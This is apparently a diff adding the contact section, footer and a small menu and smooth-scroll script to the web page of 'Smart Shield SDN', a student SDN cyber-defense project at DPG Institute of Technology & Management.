+<div id="contact"><section><div class="wrap"><div class="head"><div class="eyebrow">CONTACT</div><h1 style="font-size:clamp(2.8rem,6vw,5rem);letter-spacing:-3px">Let's talk<br><span class="cyan">cyber defense.</span></h1><p class="lead">For project demonstrations, academic collaboration or questions about Smart Shield SDN.</p></div><div class="grid2"><div class="card"><h3>Project Team</h3><p class="muted">Ankita • Chhaya • Tanisha Mahapatra</p><p class="muted">Under the guidance of Dr. Sarika Chaudhary</p><p class="muted">DPG Institute of Technology & Management<br>Gurugram, Haryana</p></div><div class="card"><form onsubmit="event.preventDefault();document.getElementById('sent').textContent='✓ Message prepared successfully';"><input required placeholder="Your name"><input required type="email" placeholder="Email address"><input placeholder="Subject"><textarea required placeholder="Your message"></textarea><button class="btn primary">Send Message</button><div id="sent" class="muted"></div></form></div></div></div></section></div>
+
+<footer><div class="wrap foot"><div><b>Smart Shield SDN</b><br>Detect. Block. Explain.</div><div>DPG Institute of Technology & Management<br>Gurugram, Haryana • B.Tech CSE (Data Science)</div></div></footer>
+<script>const m=document.querySelector(".menu"),l=document.querySelector(".links");if(m)m.onclick=()=>{l.style.display=l.style.display==="flex"?"none":"flex";l.style.position="absolute";l.style.right="16px";l.style.top="70px";l.style.flexDirection="column";l.style.background="#06101c";l.style.padding="15px";l.style.border="1px solid #27dcff33";l.style.borderRadius="12px"};
+document.querySelectorAll('a[href^="#"]').forEach(a=>a.addEventListener('click',e=>{
+  const el=document.querySelector(a.getAttribute('href')); if(el){e.preventDefault();el.scrollIntoView({behavior:'smooth'});}
+}));
+</script>
+</body></html>
